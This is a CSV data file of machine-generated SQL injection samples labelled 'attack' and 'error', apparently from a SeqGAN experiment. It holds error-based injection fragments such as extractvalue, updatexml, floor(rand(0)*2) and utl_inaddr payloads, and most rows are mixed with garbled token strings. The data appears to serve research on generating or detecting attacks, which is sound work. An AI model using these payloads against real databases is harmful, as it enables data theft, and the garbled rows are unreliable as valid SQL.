label,payload,family,payload_type,method,run_id,sample_index
attack,"1'||  (  select '"" like ""ywT or 0x717a767a71havings   )    )   having group and1o.WHERE SNT M 9067 case union union  ||r  (  =  ||chr  ""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""  (    (  *2i2  ,  ||chr  (  )  ||chr  ahr  (  rand  (  0  ||chr  )  E =  4386  )   (  )     )        )    )   ) from 0 FROM ) cous c' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'E(  4232   )    a WHERESISIINUTU  (  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,61
attack,"1%%""  =  ""Tjhrosuaszuna6825s   )     (  select FROM x 3051  1 group whereIST 1 5584INThrys.seserr.gchrt  113  (  *2   *2   and113  9067|| 1 (  )  ,  select )  )        (  ||INM  ISELECT end   concat  (  select concat  6237,  =  )  4232   concat   =   )    select   (  thenchrount_  (  (  select group or 0",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,62
attack,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,63
attack,1'||  (  select 'yw,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,64
attack,"-""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  "">j4822t'+  (  select '  (  :r  =  )   WHERE s or )  )   )    (  8190,and  =  )   (  )    )     )    concat  SELECT  1 or DINSUNelsefzed_oysasyst  6237  )    )    )   j DINT  select D unionxx.rhrro.t_.ayguachr  (    6237,1 0 0  30519067and    1   x  )     ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,65
attack,"1'||  (  select '(t'etetuaint_r. 0 (  case  113   n x  t  rand  (  #  ||chrhr  ||chhro  (  select union4386  )    )   then or when  (  rand  ||chart_r.td_sh  (  (  havingchr  (  6055  select else 0 or 3931 from group and 0x717a767a71,concat  =  u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,66
attack,"1'||  (  select 'bqwap'  =  'b"" like ""u'  =  '""  =  ""axz,xssm8382   touasinformation_schemabl,floor  113  (  =  )     SELECT d FROM  FROM (  0x7171706a710x717a767a712,concat  jyr   *u2  ,  (  ||arochrowj_adr   (  selectchr  (  =  5023  '  a  (  ) I  *   (  4232        then    by u.)   SELECT else union information_schemast_  (  113    ,  case 0 else4386   then 1   from or  )  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,67
attack,-' 3051 end  || case -chr  (  *2   (  and)    or concat  c(  (  whenw_,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,68
attack,"13785w' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ed_r  (  5840  4386  concat  ).  ,concat  4232  ||chos  )      WHEREINFROM.I end  6082  ,0x717a767a71,,  #l(  (  ||m whenm   6270or 1 7158,concat  (  0  )  0 and AND L where 1  select whenm' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'  || 0 when 6082 1 else  3051 --   5023  case 7881 D AND 7158   (i||  106  *2   thenr  chr  (  =  )  #  || AS",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,69
attack,"17864113  ||chr  =  0  ),concat  4232  )  aYW else c_r  ||cr  and  (  #  '||choh  =  )   RAT.CT  ,concat  select m   thenAby d =  6270     )   case 0 1  113  case    6913  select 3440   when   (  6237,0x717a767a71)  select when   (  0  )  )    ||      (  0  (  ,floor  rand  ,concat  )  ||chr  ||sI.case  113  )  ai,  (  select A",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,70
attack,"1-' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '2131wbk",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,71
attack,"1'tr unionCconcat  (  (  )  , union from    then IEor1 DIT  (  6055,  (  rand  ||chr  (  ,' DIM when.(  113  caserand  =  )   from 4493  0 ,1  =  )    )     )   then concat  =  ,  =  ,0x717a767a71,1   then union where 6913  =  )  ||chr   axunel  )     2   from hr  (  )  ||chr  (  ||c  (  0    113  )     )  ,",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,72
attack,-'||  (  select 'ksyocynw  randls,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,73
attack,"-S4poel'  =  'aYpo_(  =  select   --  )i   )   select x  1 end  )   4493   )    )       )         6825  )   SELECTx 3051 DI   from  (  ||u  (  )    ,and from from else -- 0 select x when.x  (  a I R and Uunion when  (  || 5305,floor0x717a767a71add  (  0 ,1 )  0   rand  (  ~  select from #varass.adrowes.erin",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,74
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'tasw'  =  't when    selects   (  )      (  ,concat  )),  ||chr  (  113  )  case    8488 1   LIST FROMun   (  ||chr  (    4232  ||c  (  3440  =  4232  ,1   then =  having CAM '   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '  ||chr  select or else 0 4493  select  1 when   0x7171706a71 when where when  )  select   )  4232  x  )    )  =  rande else from RN from y  )  select 3326  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,75
attack,"'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'hts chr  (  rand  )  select   (  thenchr  (r  =  )  )  )    fromuar or fromua  (  case union WHERE union 0 3074  )    )   (   and orx else cAND  >  =u,concat  case union AWHERE information_schemafouna' like 'leinias   and  rand  case   WHERE DNISST  (  ||ruabnatdtereas or end  )  ,,concat  select  1 when   (  9173c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,76
attack,"1'||  (  select 'e'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'adrzx.Txs   ||Cro'  =  'extx.s information_schemaT  (  )     and=   from r union floor  (  =  and (  )   )     )  )   6237u   ,  112  ) 1 7881 by concat  t  rand  9067  )  select DSINE  0  ||o  *     --,concat  ||=  (  )  select    select SSM 1210  SELECT else group by d  (  (  0 4232  ||chs group union 0 or 3440  ||chr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,77
attack,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'selectfvvnesatys",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,78
attack,"1'||  (  select '""  =  "".||cheschoutu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,79
attack,1hrjet_aseltys SM N 3785 1 concat  ||chr  6237(  casey where a else 4386  ||cr  (  )   then DISMIT(  )   and else 1 mi,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,80
attack,1  ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,81
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '4838Tfloorx",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,82
attack,"-78101210  selectCAMx.  )  caseIT  4232  )   6913  6825   when   (  #,||chhr  (  select from FROM auinas FROMtbt.ea  ul  =  ||chr  )     4493  6237,floor  (  case group group by having select union 1 4493   concat  ,1a end   )     SELECT Aunion 0x717a767a71  =  ,  (  6237)    )R     )    or union 3440  4232  x   from     (  113(w  ),1   (  ||ch",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,83
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'j_er  a union1 6825  ende froma dr  113  ||ch  (  select  1x 1 5192 concathr  (  6237  =  (N",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,84
attack,"1'||  (  select 'yT1 (  6237,1   )     SELECT G 1 or # 1 e information_schemachtst_ronsyex.rNrosuad   )  ua",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,85
attack,"-]. 1 information_schemaTxe_ 6055  0  113  (  adaatkr  (  (  ,  ||chr   0 from  (  *2 )i     )   AND x   xuT select A112  select 5192     (  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,86
attack,"1%'||  (  select ''   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,87
attack,"1""y",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,88
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   """"   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""tr"" like ""coun_atryy	  select select.aMx x  WHERE WHEREART.IANLMISST R  (  =  )   fromu113  SELECTx  (   concat  ||chr   where      x  0 6tossxounad_r.||er.g.g_addr.(  (  ||chr  (  0  case 0 7469  ~   (  3440  || RWNUOou  (  ||r  (  0x7171706a71case m    8488 and    )  9173",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,89
attack,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '_' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'0.eraLbddr.sala group SOWANDI.NUSNCTM 9173 else    )         ,0x717a767a71,floor  ||chr  (  4493  ||chr  (  ||chu  ||zuatolw  ||ato groupchasxu.as fromo E  et_i  =  ||cu6913r.as RINSTLNUNTNThroutysinie x  DISSUby  case 3051 group  LMI",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,90
attack,"1 D""NST where FROM R. end6055  )     from from FROM  113  113  ||chr  (  )     SELECT when group from  (  ||chr  (  case when   (  (  select  1 end  9067  4232  ) from union 1     FROM   ||ch (  113  )  ||Uchr  (abdrojhr_adiaynx end  )      4386  ||4386  0x7171706a71122  )  )  and group and _ 1 E  ||chr  )  ch",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,91
attack,"1"" DESFROMchrhr  6237r  0  or 6913  ||  8190  4232  113  )     0    WHERE AT by 7469  select D end  )  ||chr  (  ||chr  4493   when  112  6270  (  =  )     --2   ,0x717a767a71,floor  (  b2 SELECT 1   1 from AIhr  (  =  )  ||chr  (  (  ,0x717a767a71,  0x5c  ||  (  =  select   thenselect else union0 else x  ~  )     or 3931 5584 4493l",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,92
attack,"1%_106hrhr   from 4493  rand  --,concat  case  9173  )     ,  concat   (  =  5023  ||chr  (  1297,,  select  )     
   (    casea 1 or by endg r  (  ),  113  ||c  =  5023,else   thenILSOU group LTRysCetphtounjaads 7158  =  ||r   x   u  6055,0x717a767a71,floor  *",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,93
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'axu'  =  '_",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,94
attack,"150000001   or   then hr  (  selectmdd_r  rand  (  * case when   9325  select   )    ,andselect union1   ||chr  (  ||chr  (   when   froma   SELECTIM union FROM and  =  )       )    )     from (  ||chount_r  =  ||wuinn   a by FROM  rand  =  )     0WHERE union   select   )    5023  )   thenxNc,0x717a767a71vpoltyhr  (    *  )  SELECT W.xh",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,95
attack,-7562,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,96
attack,"1j'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'kethsxuiau' like 'amt  6825a concat  ||  (  (  select S union dchrhrr  rand  rand  6237,concat  =  0x717a767a71,1  )     3440  case  'i'  4493  select 0 FROM DIATIhrhrT  (  0  =  cr  4232  ||chrhhr  (  (  ||chr  =  rand  (  select L D from  x  select a   U  (  )  ) from end  ||chr  (  113  ) concat  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,97
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""7864(  chhr  (  )  4386  =  t  tr  )    concat  )   )    , m 5023nt  (  113  0  )     then concat  *a113  )        x   thenin unionselect dun(  )   then union else FROM end  select 1 from 0mi    )    --,  113   or (  ,O1  (  )     l  ||chr  tr  (  ||r  (  ||chr  (  =  =  ||aucdroadlsls   (n2",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,98
